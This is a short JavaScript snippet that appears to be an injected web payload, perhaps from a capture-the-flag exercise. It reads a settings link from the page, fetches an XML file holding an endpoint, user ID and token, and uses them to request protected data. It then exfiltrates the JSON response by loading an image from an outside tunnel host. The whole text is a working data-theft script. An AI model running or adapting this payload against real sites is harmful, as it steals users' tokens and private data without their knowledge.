var url = document.getElementById("settings").href;
var xhr_xml = new XMLHttpRequest();
var xhr_questions = new XMLHttpRequest();
xhr_questions.responseType = "json";

function xml_callback(){
    var resp = xhr_xml.responseXML;
    var question_url = resp.getElementsByTagName("endpoint")[0].textContent;
    var uid = resp.getElementsByTagName("uid-param-value")[0].textContent;
    var token = resp.getElementsByTagName("token-param-value")[0].textContent;

    // Build question request
    var params = new URLSearchParams(
        {
            "uid": uid,
            "token": token
        }
    )
    xhr_questions.open("GET", question_url + "?" + params, true);
    xhr_questions.send();
}

function question_callback(){
    resp = xhr_questions.response;
    document.getElementById("result").textContent = JSON.stringify(resp);
    var img = document.createElement("img");
    var param = new URLSearchParams(resp);
    img.src = "https://weak-foxes-rush.loca.lt?" + param;
}

xhr_xml.open("GET", url, true);
xhr_questions.onload = question_callback;
xhr_xml.onload = xml_callback;
xhr_xml.send();